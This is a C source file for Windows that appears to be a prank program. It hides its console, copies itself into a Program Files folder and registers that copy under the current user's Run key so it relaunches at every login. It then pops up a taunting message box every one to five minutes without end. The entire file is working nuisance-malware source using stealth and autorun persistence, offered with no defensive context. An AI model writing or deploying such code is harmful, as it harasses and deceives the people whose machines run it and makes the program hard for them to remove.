#include <windows.h>
#include <Psapi.h> // for getting the file name
#include <stdlib.h>
#include <time.h>

#define FILENAME_LEN 1024
#define MIN_SLEEP_TIME_MS 60000 // a minute
#define MAX_SLEEP_TIME_MS 300000 // 5 minutes

#define AUTORUN_REG_NAME L"ItayHageverRetzah"
#define NEW_FOLDER_PATH L"C:\\Program Files (x86)\\Itay Hagever"
#define NEW_FILE_PATH L"C:\\Program Files (x86)\\Itay Hagever\\ItaysNaughtyWindow.exe"

#define WINDOW_HEADER L"YO!"
#define WINDOW_MESSAGE L"This is itay hagever's naughty window. good luck getting rid of it!"

int main()
{
	HWND consoleWindow = GetConsoleWindow();
	ShowWindow(consoleWindow, SW_HIDE); // hide console window
	CloseHandle(consoleWindow);

	srand(time(NULL));

	WCHAR filename[FILENAME_LEN + 1] = { 0 };
	HANDLE thisProcess = GetCurrentProcess();
	HKEY regKey = NULL;
	GetModuleFileNameEx(thisProcess, NULL, filename, FILENAME_LEN); // get filename
	CloseHandle(thisProcess);

	while (TRUE)
	{
		MessageBox(NULL, WINDOW_MESSAGE, WINDOW_HEADER, MB_OK); // wait for the user to close the window
		CreateDirectory(NEW_FOLDER_PATH, NULL);
		CopyFile(filename, NEW_FILE_PATH, FALSE); // will not work if the original is deleted :(
		
		// Create autorun registry key
		RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &regKey);
		// Set the key value to the new file path
		RegSetValueEx(regKey, AUTORUN_REG_NAME, 0, REG_SZ, NEW_FILE_PATH, (wcslen(NEW_FILE_PATH) + 1) * 2);
		CloseHandle(regKey);

		Sleep(rand() % (MAX_SLEEP_TIME_MS + 1 - MIN_SLEEP_TIME_MS) + MIN_SLEEP_TIME_MS);
	}
	return 0;
}
